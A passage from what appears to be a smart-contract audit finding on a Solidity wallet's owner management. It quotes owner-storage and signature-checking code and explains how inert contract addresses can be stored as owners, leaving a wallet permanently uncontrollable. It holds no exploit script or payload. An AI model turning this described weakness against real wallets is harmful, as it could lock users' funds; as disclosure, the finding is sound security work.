        _addOwnerAtIndex(abi.encode(owner), _getMultiOwnableStorage().nextOwnerIndex++);
    }

    function addOwnerPublicKey(bytes32 x, bytes32 y) external virtual onlyOwner {
        _addOwnerAtIndex(abi.encode(x, y), _getMultiOwnableStorage().nextOwnerIndex++);
    }

    /// @notice Removes an owner. The final owner can never be removed, so the wallet always has >=1 controller.
    /// @dev `removeLastOwner` (which the Coinbase base exposes) is intentionally omitted: allowing the owner set
    ///      to reach zero would permanently brick `execute`, owner management, and upgrades.
    function removeOwnerAtIndex(uint256 index, bytes calldata owner) external virtual onlyOwner {
        if (ownerCount() == 1) {
            revert LastOwner();
        }

        _removeOwnerAtIndex(index, owner);
```

⋯
#### Lines 81-108 — _`ownerCount()` counts stored slots and `_addOwnerAtIndex` stores any owner that passes the limited validation checks._

```
    function ownerCount() public view virtual returns (uint256) {
        MultiOwnableStorage storage $ = _getMultiOwnableStorage();
        return $.nextOwnerIndex - $.removedOwnersCount;
    }

    function removedOwnersCount() public view virtual returns (uint256) {
        return _getMultiOwnableStorage().removedOwnersCount;
    }

    function _initializeOwners(bytes[] memory owners) internal virtual {
        MultiOwnableStorage storage $ = _getMultiOwnableStorage();
        uint256 nextOwnerIndex_ = $.nextOwnerIndex;
        for (uint256 i; i < owners.length; i++) {
            _addOwnerAtIndex(owners[i], nextOwnerIndex_++);
        }
        $.nextOwnerIndex = nextOwnerIndex_;
    }

    /// @dev Single chokepoint for all owner writes (initialize / addOwnerAddress / addOwnerPublicKey). Rejects
    ///      uncontrollable owners so the stored set always equals the set of reachable controllers.
    function _addOwnerAtIndex(bytes memory owner, uint256 index) internal virtual {
        OwnerValidation.validate(owner);
        if (keccak256(owner) == keccak256(abi.encode(address(this)))) revert SelfOwnerNotAllowed();
        if (isOwnerBytes(owner)) revert AlreadyOwner(owner);

        MultiOwnableStorage storage $ = _getMultiOwnableStorage();
        $.isOwner[owner] = true;
        $.ownerAtIndex[index] = owner;
```

⋯
#### Lines 101-110 — _Wallet owner storage repeats syntactic validation and rejects only the wallet itself as a self-owner._

```
    function _addOwnerAtIndex(bytes memory owner, uint256 index) internal virtual {
        OwnerValidation.validate(owner);
        if (keccak256(owner) == keccak256(abi.encode(address(this)))) revert SelfOwnerNotAllowed();
        if (isOwnerBytes(owner)) revert AlreadyOwner(owner);

        MultiOwnableStorage storage $ = _getMultiOwnableStorage();
        $.isOwner[owner] = true;
        $.ownerAtIndex[index] = owner;

        emit AddOwner(index, owner);
```

⋯
#### Lines 119-140 — _Removal clears the reachable owner and `_checkOwner` only authorizes direct owner-address calls or self-calls._ — _Direct authorization requires the owner address itself to call the wallet._

```
    function _removeOwnerAtIndex(uint256 index, bytes calldata owner) internal virtual {
        bytes memory owner_ = ownerAtIndex(index);
        if (owner_.length == 0) revert NoOwnerAtIndex(index);
        if (keccak256(owner_) != keccak256(owner)) {
            revert WrongOwnerAtIndex({index: index, expectedOwner: owner, actualOwner: owner_});
        }

        MultiOwnableStorage storage $ = _getMultiOwnableStorage();
        delete $.isOwner[owner];
        delete $.ownerAtIndex[index];
        $.removedOwnersCount++;

        emit RemoveOwner(index, owner);
    }

    function _checkOwner() internal view virtual {
        if (isOwnerAddress(msg.sender) || (msg.sender == address(this))) {
            return;
        }

        revert Unauthorized();
    }
```

### `contracts/src/wallets/HPSmartWallet.sol`
#### Lines 349-374 — _Wallet signature validation for 32-byte address owners delegates to `SignatureCheckerLib`._ — _Address-owner signatures are checked through `SignatureCheckerLib`._

```
    function _isValidSignature(bytes32 hash, bytes calldata signature)
        internal
        view
        virtual
        override
        returns (bool)
    {
        SignatureWrapper memory sigWrapper = abi.decode(signature, (SignatureWrapper));
        bytes memory ownerBytes = ownerAtIndex(sigWrapper.ownerIndex);

        // Out-of-range or removed owner index: report failure rather than reverting.
        if (ownerBytes.length == 0) {
            return false;
        }

        if (ownerBytes.length == 32) {
            if (uint256(bytes32(ownerBytes)) > type(uint160).max) {
                revert InvalidEthereumAddressOwner(ownerBytes);
            }

            address ownerAddr;
            assembly ("memory-safe") {
                ownerAddr := mload(add(ownerBytes, 32))
            }

            return SignatureCheckerLib.isValidSignatureNow(ownerAddr, hash, sigWrapper.signatureData);
```

### `contracts/lib/solady/src/utils/SignatureCheckerLib.sol` (2 locations)
#### Lines 29-71 — _Address signatures require ECDSA for EOAs or ERC-1271 magic from contracts, which an inert contract owner does not provide._

```
    /// @dev Returns whether `signature` is valid for `signer` and `hash`.
    /// If `signer.code.length == 0`, then validate with `ecrecover`, else
    /// it will validate with ERC1271 on `signer`.
    function isValidSignatureNow(address signer, bytes32 hash, bytes memory signature)
        internal
        view
        returns (bool isValid)
    {
        if (signer == address(0)) return isValid;
        /// @solidity memory-safe-assembly
        assembly {
            let m := mload(0x40)
            for {} 1 {} {
                if iszero(extcodesize(signer)) {
                    switch mload(signature)
                    case 64 {
                        let vs := mload(add(signature, 0x40))
                        mstore(0x20, add(shr(255, vs), 27)) // `v`.
                        mstore(0x60, shr(1, shl(1, vs))) // `s`.
                    }
                    case 65 {
                        mstore(0x20, byte(0, mload(add(signature, 0x60)))) // `v`.
                        mstore(0x60, mload(add(signature, 0x40))) // `s`.
                    }
                    default { break }
                    mstore(0x00, hash)
                    mstore(0x40, mload(add(signature, 0x20))) // `r`.
                    let recovered := mload(staticcall(gas(), 1, 0x00, 0x80, 0x01, 0x20))
                    isValid := gt(returndatasize(), shl(96, xor(signer, recovered)))
                    mstore(0x60, 0) // Restore the zero slot.
                    mstore(0x40, m) // Restore the free memory pointer.
                    break
                }
                let f := shl(224, 0x1626ba7e)
                mstore(m, f) // `bytes4(keccak256("isValidSignature(bytes32,bytes)"))`.
                mstore(add(m, 0x04), hash)
                let d := add(m, 0x24)
                mstore(d, 0x40) // The offset of the `signature` in the calldata.
                // Copy the `signature` over.
                let n := add(0x20, mload(signature))
                let copied := staticcall(gas(), 4, signature, n, add(m, 0x44), n)
                isValid := staticcall(gas(), signer, m, add(returndatasize(), 0x44), d, 0x20)
                isValid := and(eq(mload(d), f), and(isValid, copied))
```

⋯
#### Lines 42-72 — _Contract signers are accepted only if they return the ERC-1271 magic value._

```
                if iszero(extcodesize(signer)) {
                    switch mload(signature)
                    case 64 {
                        let vs := mload(add(signature, 0x40))
                        mstore(0x20, add(shr(255, vs), 27)) // `v`.
                        mstore(0x60, shr(1, shl(1, vs))) // `s`.
                    }
                    case 65 {
                        mstore(0x20, byte(0, mload(add(signature, 0x60)))) // `v`.
                        mstore(0x60, mload(add(signature, 0x40))) // `s`.
                    }
                    default { break }
                    mstore(0x00, hash)
                    mstore(0x40, mload(add(signature, 0x20))) // `r`.
                    let recovered := mload(staticcall(gas(), 1, 0x00, 0x80, 0x01, 0x20))
                    isValid := gt(returndatasize(), shl(96, xor(signer, recovered)))
                    mstore(0x60, 0) // Restore the zero slot.
                    mstore(0x40, m) // Restore the free memory pointer.
                    break
                }
                let f := shl(224, 0x1626ba7e)
                mstore(m, f) // `bytes4(keccak256("isValidSignature(bytes32,bytes)"))`.
                mstore(add(m, 0x04), hash)
                let d := add(m, 0x24)
                mstore(d, 0x40) // The offset of the `signature` in the calldata.
                // Copy the `signature` over.
                let n := add(0x20, mload(signature))
                let copied := staticcall(gas(), 4, signature, n, add(m, 0x44), n)
                isValid := staticcall(gas(), signer, m, add(returndatasize(), 0x44), d, 0x20)
                isValid := and(eq(mload(d), f), and(isValid, copied))
                break
```

## Description

The wallet accepts any 32-byte value that decodes to a nonzero `uint160` as an address owner, even though wallet control for address owners requires either direct calls from that address or successful signature validation through `SignatureCheckerLib`. This means a contract address with no usable call path and no ERC-1271 `isValidSignature` implementation can be stored as an owner during `createAccount`, `initialize`, or later `addOwnerAddress`. Once stored, that inert entry is still counted as an owner, so the system treats the wallet as properly controlled even though the address cannot actually authorize execution, upgrades, or owner management. A wallet can therefore be deployed already unreachable, or an authorized owner can add an inert contract owner and then remove the last reachable controller while `ownerCount()` remains above one. In both cases the underlying problem is the same: stored owner slots are assumed to represent live controllers, but address-shaped values are never vetted for real controllability.

## Root cause

`OwnerValidation.validate` and the owner-addition paths treat any nonzero address-shaped value as a valid controller, while the wallet's actual authorization model requires an EOA that can sign or a contract that can successfully authorize via ERC-1271/direct calls.

## Impact

Assets or paymaster credit sent to such a wallet can become permanently stuck because no valid caller or signature can satisfy authorization for the remaining owner set. The issue can arise at deployment time or during owner rotation, allowing a wallet to be left with only inert owners and no path to recover control.
